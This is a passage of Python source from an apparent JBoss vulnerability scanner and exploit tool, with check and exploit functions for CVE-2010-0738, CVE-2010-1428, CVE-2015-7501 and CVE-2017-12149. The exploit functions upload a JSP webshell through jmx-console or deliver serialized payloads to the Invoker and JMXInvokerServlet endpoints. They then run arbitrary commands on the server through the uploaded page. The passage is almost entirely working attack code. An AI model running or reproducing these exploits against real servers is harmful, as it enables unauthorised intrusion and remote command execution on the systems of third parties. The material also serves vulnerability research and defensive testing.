            self.req = requests.head(self.url + self.path + self.poc, headers=self.headers, timeout=self.timeout,
                                             verify=False)
            self.request = requests.get(self.url + "/shells/shells.jsp", headers=self.headers, timeout=self.timeout,
                                            verify=False)
            self.req = requests.head(self.url + self.path + self.poc, headers=self.headers, timeout=self.timeout,
                                     verify=False)
            time.sleep(0.5)
            self.request = requests.get(self.url + "/shells/shells.jsp", headers=self.headers, timeout=self.timeout,
                                        verify=False)
            if md in misinformation(self.request.text, md) and self.request.status_code == 200:
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.poc
                self.vul_info["prt_info"] = "[jmx-console] [upload: " + self.url + "/shells/shells.jsp ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()


    # 2020-09-24
    def cve_2010_1428_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "RedHat JBoss: CVE-2010-1428"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "JBoss WEB 控制台安全验证绕过漏洞"
        self.vul_info["vul_numb"] = "CVE-2010-1428"
        self.vul_info["vul_apps"] = "JBoss"
        self.vul_info["vul_date"] = "2010-04-19"
        self.vul_info["vul_vers"] = "4.2.0 - 4.3.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "任意文件上传"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "JBoss企业应用平台中存在多个非授权访问漏洞，远程用户可以绕过认证执行非授权操作或读取敏感信息。"
        self.vul_info["cre_date"] = "2021-01-28"
        self.vul_info["cre_auth"] = "zhzyker"
        self.path = "/web-console/Invoker"
        md = random_md5()
        cmd = "echo " + md
        #  self.data = ":-)"
        bad = "20" + md
        try:

            self.req = requests.head(self.url + self.path, data=self.payload_cve_2010_1428,
                                             headers=self.headers, timeout=self.timeout, verify=False)
            time.sleep(0.5)
            self.cmd = urlencode({"ppp": cmd})
            self.request = requests.get(self.url + "/jexws4/jexws4.jsp?" + self.cmd, headers=self.headers,
                                            timeout=self.timeout, verify=False)
            self.req = requests.head(self.url + self.path, data=self.payload_cve_2010_1428,
                                     headers=self.headers, timeout=self.timeout, verify=False)
            self.cmd = urlencode({"ppp": cmd})
            self.request = requests.get(self.url + "/jexws4/jexws4.jsp?" + self.cmd, headers=self.headers,
                                        timeout=self.timeout, verify=False)
            if md in misinformation(self.request.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.url + self.path
                self.vul_info["prt_info"] = "[web-console] [upload: " + self.url + "/jexws4/jexws4.jsp?ppp=whoami ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    # 2020-09-23 RedHat JBoss: CVE-2015-7501, JMXInvokerServlet
    def cve_2015_7501_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "RedHat JBoss: CVE-2015-7501"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "JBoss 反序列化远程命令执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2015-7501"
        self.vul_info["vul_apps"] = "JBoss"
        self.vul_info["vul_date"] = "2015-11-15"
        self.vul_info["vul_vers"] = "5.x, 6.x"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程命令执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "此漏洞主要是由于JBoss中invoker/JMXInvokerServlet路径对外开放，由于JBoss的jmx组件支" \
                                    "持Java反序列化，并且在反序列化过程中没有加入有效的安全检测机制，" \
                                    "导致攻击者可以传入精心构造好的恶意序列化数据，在jmx对其进行反序列化处理时，" \
                                    "导致传入的携带恶意代码的序列化数据执行，造成反序列化漏洞"
        self.vul_info["cre_date"] = "2021-01-28"
        self.vul_info["cre_auth"] = "zhzyker"
        self.path = "/invoker/JMXInvokerServlet"
        self.data = ":-)"
        md = random_md5()
        cmd = "echo " + md
        bad = "20" + md
        try:
            self.request = requests.post(self.url + self.path, data=self.payload_cve_2015_7501,
                                             headers=self.headers, timeout=self.timeout, verify=False)
            time.sleep(0.5)
            self.cmd = urlencode({"ppp": cmd})
            self.request = requests.get(self.url + "/jexinv4/jexinv4.jsp?" + self.cmd, headers=self.headers,
                                            timeout=self.timeout, verify=False)
            self.req = requests.post(self.url + self.path, data=self.payload_cve_2015_7501,
                                         headers=self.headers, timeout=self.timeout, verify=False)
            self.cmd = urlencode({"ppp": cmd})
            self.request = requests.get(self.url + "/jexinv4/jexinv4.jsp?" + self.cmd, headers=self.headers,
                                        timeout=self.timeout, verify=False)
            if md in self.request.text:
                if md in misinformation(self.request.text, md):
                    self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["vul_payd"] = self.url + self.path
                    self.vul_info[
                            "prt_info"] = "[JMXInvokerServlet] [upload: " + self.url + "/jexws4/jexws4.jsp?ppp=whoami ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2017_12149_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "RedHat JBoss: CVE-2017-12149"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "JBoss 反序列化远程命令执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2017-12149"
        self.vul_info["vul_apps"] = "JBoss"
        self.vul_info["vul_date"] = "2017-12-14"
        self.vul_info["vul_vers"] = "5.x, 6.x"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程命令执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java" \
                                    "文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。"
        self.vul_info["cre_date"] = "2021-01-28"
        self.vul_info["cre_auth"] = "zhzyker"
        self.path = "/invoker/readonly"
        try:
            request = requests.get(self.url + self.path, headers=self.headers, timeout=self.timeout, verify=False)
            if request.status_code == 500 and r"org.jboss.invocation.http.servlet" in request.text:
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoC_MaYbE"
                self.vul_info["vul_payd"] = self.url + self.path
                self.vul_info["prt_info"] = "[maybe] [url: " + self.url + self.path + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()


    def cve_2010_0738_exp(self, cmd):
        vul_name = "RedHat JBoss: CVE-2010-0738"
        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
        self.path = "/jmx-console/HtmlAdaptor"
        md = random_md5()[:-20]
        self.exp = ("?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName="
                    "store&argType=java.lang.String&arg0=" + md + ".war&argType=java.lang.String&arg1=" + md + "&argType=java"
                    ".lang.String&arg2=.jsp&argType=java.lang.String&arg3=" + self.jsp_webshell + "&argType=boolean&arg4=True")
        self.headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        'User-Agent': self.ua,
                        "Connection": "close"}
        try:
            self.req = requests.head(self.url + self.path + self.exp, headers=self.headers, timeout=self.timeout,
                                             verify=False)
            self.jsp = self.url + "/" + self.name + "/" + self.name + ".jsp" + "?pwd=password&cmd=" + cmd
            self.request = requests.get(self.jsp, headers=self.headers, timeout=self.timeout, verify=False)
            r = self.jsp
            r += "\n"
            r += self.request.text
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(r, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2010_1428_exp(self, cmd):
        vul_name = "RedHat JBoss: CVE-2010-1428"
        self.path = "/web-console/Invoker"
        self.headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        'User-Agent': self.ua,
                        "Connection": "close"}
        try:
            self.req = requests.head(self.url + self.path, data=self.payload_cve_2010_1428,
                                             headers=self.headers, timeout=self.timeout, verify=False)
            time.sleep(0.5)
            self.cmd = urlencode({"ppp": cmd})
            self.request = requests.get(self.url + "/jexws4/jexws4.jsp?" + self.cmd, headers=self.headers,
                                            timeout=self.timeout, verify=False)
            r = self.url + "/jexws4/jexws4.jsp?" + self.cmd
            r += "\n"
            r += self.request.text
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(r, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2015_7501_exp(self, cmd):
        vul_name = "RedHat JBoss: CVE-2015-7501"
        self.path = "/invoker/JMXInvokerServlet"
        self.headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        'User-Agent': self.ua,
                        "Connection": "close"}
        try:
            self.req = requests.post(self.url + self.path, data=self.payload_cve_2015_7501,
                                             headers=self.headers, timeout=self.timeout, verify=False)
            time.sleep(0.5)
            self.cmd = urlencode({"ppp": cmd})
            self.request = requests.get(self.url + "/jexinv4/jexinv4.jsp?" + self.cmd, headers=self.headers,
                                            timeout=self.timeout, verify=False)

            r = self.url + "/jexinv4/jexinv4.jsp?" + self.cmd
            r += "\n"
            r += self.request.text
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(r, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)